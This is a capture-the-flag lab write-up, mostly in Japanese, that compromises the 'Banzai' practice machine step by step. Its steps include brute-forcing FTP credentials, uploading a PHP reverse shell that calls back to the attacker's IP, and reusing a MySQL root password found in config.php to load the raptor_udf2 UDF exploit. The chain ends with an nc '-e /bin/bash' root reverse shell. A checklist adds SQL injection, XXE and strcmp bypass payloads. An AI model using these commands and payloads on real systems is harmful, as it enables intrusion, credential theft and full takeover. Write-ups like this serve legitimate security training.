# Banzai

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.243.56  |
| Local IP          | 192.168.49.243   |
| Local listen port | 4444 |

## Nmap

- [x] Full TCP port scan

```bash
ports=$(nmap -p- --min-rate=1000 -T4 -Pn 192.168.243.56 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```bash
$ nmap -p$ports -sV -A -Pn 192.168.243.56
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 19:48 JST
Nmap scan report for 192.168.243.56
Host is up (0.24s latency).

PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open   smtp       Postfix smtpd
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
8080/tcp open   http       Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
|_http-title: Banzai
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.09 seconds

```

- [x] Well-known UDP port scan

```bash
$ sudo nmap -Pn -sU --min-rate=10000 192.168.243.56
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 19:44 JST
Nmap scan report for 192.168.243.56
Host is up.
All 1000 scanned ports on 192.168.243.56 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds

```

## TCP
### FTP - 21

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
| vsftpd        | 3.0.3   | none          |

- [x] Anonymous login

  - [x] `anonymous:`

  ```bash
  $ ftp anonymous@192.168.243.56 21
  Connected to 192.168.243.56.
  220 (vsFTPd 3.0.3)
  331 Please specify the password.
  Password:
  530 Login incorrect.
  ftp: Login failed
  ftp> ^D
  221 Goodbye.
  
  ```

  - [x] `anonymous:anonymous`

  ```bash
  $ ftp anonymous@192.168.243.56 21
  Connected to 192.168.243.56.
  220 (vsFTPd 3.0.3)
  331 Please specify the password.
  Password:
  530 Login incorrect.
  ftp: Login failed
  ftp> ^D
  221 Goodbye.
  
  ```

- [ ] Brute-force attack

  - [x] default credentials `admin:admin`

  ```bash
  $ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.243.56 -V -f -t 60
  <snip>
  [ATTEMPT] target 192.168.243.56 - login "webserver" - pass "webpages" - 59 of 66 [child 58] (0/0)
  [ATTEMPT] target 192.168.243.56 - login "fdrusers" - pass "sresurdf" - 60 of 66 [child 59] (0/0)
  [21][ftp] host: 192.168.243.56   login: admin   password: admin
  [STATUS] attack finished for 192.168.243.56 (valid pair found)
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-27 19:55:09
  ```

  `admin:admin` でログインする．

  ```bash
  $ ftp admin@192.168.243.56 21
  Connected to 192.168.243.56.
  220 (vsFTPd 3.0.3)
  331 Please specify the password.
  Password:
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp>
  
  ```

  `wget` を使ってすべてのファイルとディレクトリをダウンロードする．

  ```bash
  $ wget -r --no-passive ftp://admin:admin@192.168.243.56:21/
  <snip>
  
  2022-05-27 20:10:11 (1.01 GB/s) - `192.168.243.56/lib/wow/wow.min.js' へ保存終了 [8159]
  
  終了しました --2022-05-27 20:10:11--
  経過時間: 1m 36s
  ダウンロード完了: 53 ファイル、2.9M バイトを 18s で取得 (163 KB/s)
  
  ```

  `192.168.243.56` というディレクトリが作成され，その中にファイルとディレクトリが保存される．

  ```bash
  $ ll 192.168.243.56
  合計 44
  drwxr-xr-x  2 funa funa  4096 May 27 20:08 contactform
  drwxr-xr-x  2 funa funa  4096 May 27 20:08 css
  drwxr-xr-x  3 funa funa  4096 May 27 20:09 img
  -rw-r--r--  1 funa funa 23364 May 27  2020 index.php
  drwxr-xr-x  2 funa funa  4096 May 27 20:09 js
  drwxr-xr-x 11 funa funa  4096 May 27 20:10 lib
  
  ```

  `ftp` のディレクトリルートは `HTTP` のディレクトリルートと同じ場所を指している．

  このディレクトリは `ftp` でファイルをアップロードすることが可能なため，`php-reverse-shell.php` をアップロードする．

  ```bash
  $ cp /usr/share/webshells/php/php-reverse-shell.php ./
  ```

  ファイルの `ip`, `port` を変更する．この際 `HTTP` は `ftp` と通信していることが予想されるため，`21` を指定する．

  ```bash
  $ grep -n -A 1 ip php-reverse-shell.php
  <snip>
  --
  49:$ip = '192.168.49.243';  // CHANGE THIS
  50-$port = 21;       // CHANGE THIS
  --
  <snip>
  ```

  ファイルをアップロードする．

  ```bash
  ftp> put php-reverse-shell.php
  local: php-reverse-shell.php remote: php-reverse-shell.php
  200 EPRT command successful. Consider using EPSV.
  150 Ok to send data.
  100% |**************************************************************************|  5495      180.70 MiB/s    00:00 ETA
  226 Transfer complete.
  5495 bytes sent in 00:00 (11.09 KiB/s)
  ftp> ls
  200 EPRT command successful. Consider using EPSV.
  150 Here comes the directory listing.
  drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
  drwxr-xr-x    2 1001     0            4096 May 26  2020 css
  drwxr-xr-x    3 1001     0            4096 May 26  2020 img
  -rw-r--r--    1 1001     0           23364 May 27  2020 index.php
  drwxr-xr-x    2 1001     0            4096 May 26  2020 js
  drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
  -rw-r--r--    1 1001     1001         5495 May 27 22:12 php-reverse-shell.php
  226 Directory send OK.
  ftp>
  ```

  `nc` でリバースシェルを待ち受ける．

  ```bash
  $ nc -lnvp 21
  listening on [any] 21 ...
  
  ```

  ブラウザなどで `http://192.168.243.56:8295/php-reverse-shell.php` にアクセスし，リバースシェルを受け取る．

  ```bash
  $ nc -lnvp 21
  listening on [any] 21 ...
  connect to [192.168.49.243] from (UNKNOWN) [192.168.243.56] 54078
  Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
   22:25:18 up 15:44,  0 users,  load average: 0.00, 0.00, 0.00
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  <snip>
  $ pwd
  /home/banzai
  $ cat local.txt
  9bb97ed36d3328e301ad518bb2284410
  
  ```

  `local.txt` を手に入れることができた．

  - [ ] passwords list

  ```bash
  hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://192.168.243.56 -V -f -t 60
  ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  ftp joe@192.168.243.56 21
  ```

### SSH - 22

| software name | version                               | vulnerability                                                |
| ------------- | ------------------------------------- | ------------------------------------------------------------ |
| OpenSSH       | 7.4p1 Debian 10+deb9u7 (protocol 2.0) | [OpenSSH 2.3 < 7.7 - Username Enumeration](https://www.exploit-db.com/exploits/45233) |

- [ ] Brute-force attack

  - [x] default credentials

  ```bash
  $ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://192.168.243.56 -V -f -t 60
  <snip>
  [REDO-ATTEMPT] target 192.168.243.56 - login "admin" - pass "motorola" - 156 of 163 [child 40] (31/31)
  1 of 1 target completed, 0 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-27 20:14:02
  
  ```

  - [ ] passwords list

  ```bash
  hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.243.56 -V -f -t 60
  ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  ssh joe@192.168.243.56
  ```

  If `no matching host key type found` error occurs with this command, try the following.

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-dss username@192.168.243.56
  ```

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-rsa username@192.168.243.56
  ```

### SMTP - 25

| software name | version | vulnerability                                                |
| ------------- | ------- | ------------------------------------------------------------ |
| Postfix smtpd |         | [Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection](https://www.exploit-db.com/exploits/34896) |

ユーザを列挙する．

```bash
$ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.243.56
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Fri May 27 23:30:53 2022 #########
192.168.243.56: admin exists
192.168.243.56: _apt exists
192.168.243.56: backup exists
192.168.243.56: bin exists
192.168.243.56: daemon exists
192.168.243.56: ftp exists
192.168.243.56: games exists
192.168.243.56: gnats exists
192.168.243.56: irc exists
192.168.243.56: list exists
192.168.243.56: lp exists
192.168.243.56: mail exists
192.168.243.56: man exists
192.168.243.56: messagebus exists
192.168.243.56: mysql exists
192.168.243.56: news exists
192.168.243.56: nobody exists
192.168.243.56: postgres exists
192.168.243.56: postfix exists
192.168.243.56: postmaster exists
192.168.243.56: proxy exists
192.168.243.56: root exists
192.168.243.56: ROOT exists
192.168.243.56: sshd exists
192.168.243.56: sync exists
192.168.243.56: sys exists
192.168.243.56: systemd-bus-proxy exists
192.168.243.56: systemd-network exists
192.168.243.56: systemd-resolve exists
192.168.243.56: systemd-timesync exists
192.168.243.56: uucp exists
192.168.243.56: webmaster exists
192.168.243.56: www-data exists
192.168.243.56: www exists
######## Scan completed at Fri May 27 23:31:27 2022 #########
34 results.

168 queries in 34 seconds (4.9 queries / sec)

```

バージョンが不明なので刺さるかわからないが，見つけた脆弱性を試してみる．[Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection](https://www.exploit-db.com/exploits/34896)

```bash
$ python2 34896.py 192.168.243.56 id

```

特に何も返ってこないので刺さってなさそう．

### PostgreSQL - 5432

| software name | version                             | vulnerability |
| ------------- | ----------------------------------- | ------------- |
| PostgreSQL    | DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17 |               |

- [ ] login default credentials

  - [ ] `postgres:`

  ```bash
  $ psql -h 192.168.243.56 -p 5432 -U postgres
  ```

  - [ ] `postgres:postgres`

### HTTP - 8080



### HTTP - 8295

- [ ] Check software version

| software name  | version         | vulnerability |
| -------------- | --------------- | ------------- |
| Apache         | 2.4.25 (Debian) |               |
| jQuery Migrate | 3.0.0           |               |
| jQuery         | 3.2.1           |               |
| PHP            |                 |               |

- [ ] Server Info: Hosts: `banzai.offseclabs.com`, 127.0.1.1
- [ ] Directory buster
  - [ ] /admin


```bash
gobuster dir -u http://192.168.243.56:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

If the web server we are attacking is configured to always respond with a 200 response code, try the following.

```bash
gobuster dir -u http://192.168.243.56:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s "204,301,302,307,401,403"
```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |

- [ ] login page
  - [ ] Default credentials
    - [ ] admin:admin
    - [ ] admin:password
    - [ ] administrator:administrator
    - [ ] administrator:password
    - [ ] root:root
    - [ ] root:password

  - [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)
    - [ ] 123456
    - [ ] 123456789
    - [ ] qwerty

  - [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
    - [ ] admin' or '1'='1
    - [ ] admin" or "1"="1
    - [ ] admin") or ("1"="1

- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

- [ ] Check `.htpasswd` credentials

```bash
$ pwd
/var/www/html
$ ls -a
.htaccess	.htpasswd
$ cat .htpasswd
username:password
```



## Linux Privilege Escalation

- [ ] List SUDO binaries

```bash
sudo -l
```

- [ ] Find SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

If the owner of the binary is `root`, check [GTFOBins](https://gtfobins.github.io/).

- [ ] Find files owned by any group

```bash
find / -group any_group -type f 2>/dev/null
```

- [ ] Enumerate scheduled jobs with [pspy](https://github.com/DominicBreuker/pspy)

```bash local
python3 -m http.server 8000
```

```bash remote
wget http://192.168.49.243:8000/pspy64
chmod +x pspy64
./pspy64
```

- [ ] Check [PayloadsAllTheThings Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [x] remote enum

`/var/www` に `config.php` というファイルがあり，データベースの認証情報のようなものが書かれている．

```bash
www-data@banzai:/var/www$ ls
ls
config.php  html
www-data@banzai:/var/www$ cat config.php
cat config.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>

```

`netstat` を使ってリスニングサービスを調べると，`MySQL` のデフォルトポートである `3306` を使っていることがわかる．

```bash
www-data@banzai:/var/www$ netstat -tlpn
netstat -tlpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::8080                 :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::5432                 :::*                    LISTEN      -
tcp6       0      0 :::25                   :::*                    LISTEN      -
tcp6       0      0 :::8295                 :::*                    LISTEN      -

```

`MySQL` のプロセスを調べると，`root` 権限で実行されていることがわかる．

```bash
www-data@banzai:/var/www$ ps aux | grep -i mysql
ps aux | grep -i mysql
root       696  0.0  8.5 1122720 175548 ?      Sl   07:11   0:00 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid
www-data  1517  0.0  0.0  11108   940 pts/0    S+   07:35   0:00 grep -i mysql

```

権限昇格の方法 [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) を見つけたので，`MySQL` のバージョンを調べる．

```bash
www-data@banzai:/var/www$ mysql -u root -p
mysql -u root -p
Enter password: EscalateRaftHubris123

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

```

バージョンは `5.7.30` のため範囲外であるが，一応試しておく．

ローカルからリモートにペイロードを送る．この際ポートの制限に掛らないように `http` と通信しているポートにする．

```bash
$ python3 -m http.server 8295
Serving HTTP on 0.0.0.0 port 8295 (http://0.0.0.0:8295/) ...

```

```bash
www-data@banzai:/var/www$ wget http://192.168.49.243:8295/1518.c
wget http://192.168.49.243:8295/1518.c
--2022-05-28 09:31:47--  http://192.168.49.243:8295/1518.c
Connecting to 192.168.49.243:8295... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3378 (3.3K) [text/x-csrc]
Saving to: '1518.c'

1518.c              100%[===================>]   3.30K  --.-KB/s    in 0s

2022-05-28 09:31:47 (357 MB/s) - '1518.c' saved [3378/3378]

www-data@banzai:/var/www$ ls
ls
1518.c  config.php  html

```

コンパイルする．

```bash
www-data@banzai:/var/www$ mv 1518.c raptor_udf2.c
mv 1518.c raptor_udf2.c
www-data@banzai:/var/www$ ls
ls
config.php  html  raptor_udf2.c
www-data@banzai:/var/www$ gcc -g -c raptor_udf2.c
gcc -g -c raptor_udf2.c
www-data@banzai:/var/www$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
<,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

```

手に入れた認証情報で `root` としてログインする．

```bash
www-data@banzai:/var/www$ mysql -u root -p
mysql -u root -p
Enter password: EscalateRaftHubris123

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

```

`raptor_udf2.so` を設定する．

```bash
mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/var/www/raptor_udf2.so'));
insert into foo values(load_file('/var/www/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> show variables like 'plugin_dir';
show variables like 'plugin_dir';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.01 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.01 sec)

mysql> select * from mysql.func;
select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)

mysql> select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
+----------------------------------------------------------------------+
| do_system('id > /var/www/out; chown www-data.www-data /var/www/out') |
+----------------------------------------------------------------------+
|                                                                    0 |
+----------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> \! sh
\! sh
$ cat /var/www/out
cat /var/www/out
uid=0(root) gid=114(mysql) groups=114(mysql)

```

`id` コマンドが `root` として実行されているため，権限昇格が成功していることがわかる．

`nc` をコピーし，実行権限があることを確認してリバースシェルを起動する．この際通信が可能なポートを使うように気をつける．

```bash
$ which nc
which nc
/bin/nc
$ cp /bin/nc ./
cp /bin/nc ./
$ ls -la
ls -la
total 72
drwxr-xr-x  3 www-data root      4096 May 28 10:02 .
drwxr-xr-x 12 root     root      4096 Jun  4  2020 ..
-rw-r--r--  1 admin    root       135 May 26  2020 config.php
drwxr-xr-x  7 admin    root      4096 May 28 07:18 html
-rwxr-xr-x  1 www-data www-data 27264 May 28 10:02 nc
-rw-r-----  1 www-data www-data    45 May 28 09:50 out
-rw-rw-rw-  1 www-data www-data  3378 May 28 09:21 raptor_udf2.c
-rw-rw-rw-  1 www-data www-data  7288 May 28 09:38 raptor_udf2.o
-rwxrwxrwx  1 www-data www-data 11192 May 28 09:40 raptor_udf2.so
$ exit
exit
mysql> select do_system('/var/www/nc 192.168.49.243 8295 -e /bin/bash');
select do_system('/var/www/nc 192.168.49.243 8295 -e /bin/bash');

```

リバースシェルを受け取る．

```bash
$ nc -lnvp 8295
listening on [any] 8295 ...
connect to [192.168.49.243] from (UNKNOWN) [192.168.243.56] 35536
id
uid=0(root) gid=114(mysql) groups=114(mysql)
cd /root
ls
proof.txt
cat proof.txt
ec4ffc1a47f9afc3650586a261da1e47

```

`proof.txt` を手に入れることができた．

## If you are stuck

- [ ] Are there any areas where you are guessing "it would be ____" without examining the details?

- [ ] Have you tried "all" the information available on the internet? 

